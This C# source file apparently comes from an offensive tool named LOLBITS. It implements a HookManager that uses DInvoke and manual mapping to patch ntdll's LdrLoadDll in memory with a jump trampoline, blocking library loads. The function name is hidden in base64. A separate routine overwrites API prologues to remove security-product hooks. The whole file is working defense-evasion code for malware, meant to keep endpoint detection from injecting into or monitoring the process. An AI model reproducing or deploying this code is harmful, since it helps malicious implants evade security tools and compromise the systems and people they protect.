using System;
using System.Runtime.CompilerServices;
using System.Text;

namespace LOLBITS.Protection
{
    public class HookManager
    {

        private byte[] originalOpcodes;
        private SysCallManager sysCall;
        private IntPtr libraryAddress;
        
        [MethodImpl(MethodImplOptions.NoInlining)]
        public DInvoke.Native.NTSTATUS hookFunc(string pathToFile, ulong flags, string moduleName, IntPtr handle)
        {
            return DInvoke.Native.NTSTATUS.Success; //our hook function will just deny the loading of external libraries
        }

        public HookManager(SysCallManager sysCall)
        {
            this.sysCall = sysCall;

            originalOpcodes = is64BitsProcessor() ? new byte[13] : new byte[6];

        }
        private bool is64BitsProcessor()
        {
            return IntPtr.Size == 8 ? true : false;
        }

        public unsafe bool Install()
        {

            uint oldProtect = 0, x = 0;
            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
            object[] loadLibrary = { "ntdll.dll" };

            libraryAddress = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA",
                                                                                      typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);

            object[] procAddress = { libraryAddress, Encoding.UTF8.GetString(Convert.FromBase64String("TGRyTG9hZERsbA==")) };

            var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress",
                                                                            typeof(DInvoke.Win32.DELEGATES.GetProcAddress), procAddress);
            if (address == IntPtr.Zero)
                return false;

            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)13, (uint)0x004, oldProtect };

            IntPtr response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);

            oldProtect = (uint)parameters[4];

            var m = typeof(HookManager).GetMethod("hookFunc");
            RuntimeHelpers.PrepareMethod(m.MethodHandle);
            IntPtr replacementSite = m.MethodHandle.GetFunctionPointer();

            byte* originalSitePointer = (byte*)address.ToPointer();

            for (int k = 0; k < originalOpcodes.Length; k++)
            {
                originalOpcodes[k] = *(originalSitePointer + k);
            }

            if (is64BitsProcessor())
            {
                
                *originalSitePointer = 0x49;
                *(originalSitePointer + 1) = 0xBB;
                *((ulong*)(originalSitePointer + 2)) = (ulong)replacementSite.ToInt64(); //sets 8 bytes

                //jmp r11
                *(originalSitePointer + 10) = 0x41;
                *(originalSitePointer + 11) = 0xFF;
                *(originalSitePointer + 12) = 0xE3;
            }
            else
            {

                *originalSitePointer = 0x68;
                *((uint*)(originalSitePointer + 1)) = (uint)replacementSite.ToInt32(); //sets 4 bytes

                //ret
                *(originalSitePointer + 5) = 0xC3;
            }

            parameters = new object[] { (IntPtr)(-1), address, (UIntPtr)13, oldProtect, x };
            response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
                                                                         typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);

            return true;
        }
        
        public unsafe bool unhookSyscall(string dllName, string apiCall, byte[] content)
        {

            uint oldProtect = 0, x = 0;
            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
            object[] loadLibrary = { dllName };

            var addr = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA",
                                                                                      typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);

            object[] procAddress = { addr, apiCall };

            var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress",
                                                                            typeof(DInvoke.Win32.DELEGATES.GetProcAddress), procAddress);
            if (address == IntPtr.Zero)
                return false;

            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)13, (uint)0x004, oldProtect };

            IntPtr response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);

            oldProtect = (uint)parameters[4];

            byte* originalSitePointer = (byte*)address.ToPointer();

            for(int k = 0; k < content.Length; k++)
                *(originalSitePointer + k) = content[k];

            return true;
        }

        public unsafe bool Uninstall()
        {
            uint oldProtect = 0, x = 0;
            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");

            object[] procAddress = { libraryAddress, Encoding.UTF8.GetString(Convert.FromBase64String("TGRyTG9hZERsbA==")) };

            var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress",
                                                                            typeof(DInvoke.Win32.DELEGATES.GetProcAddress), procAddress);
            if (address == IntPtr.Zero)
                return false;

            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)13, (uint)0x004, oldProtect };

            IntPtr response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);

            oldProtect = (uint)parameters[4];

            byte* originalSitePointer = (byte*)address.ToPointer();

            for (int k = 0; k < originalOpcodes.Length; k++)
                *(originalSitePointer + k) = originalOpcodes[k];            

            parameters = new object[] { (IntPtr)(-1), address, (UIntPtr)13, oldProtect, x };
            response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
                                                                         typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);

            return true;
        }
    }
}
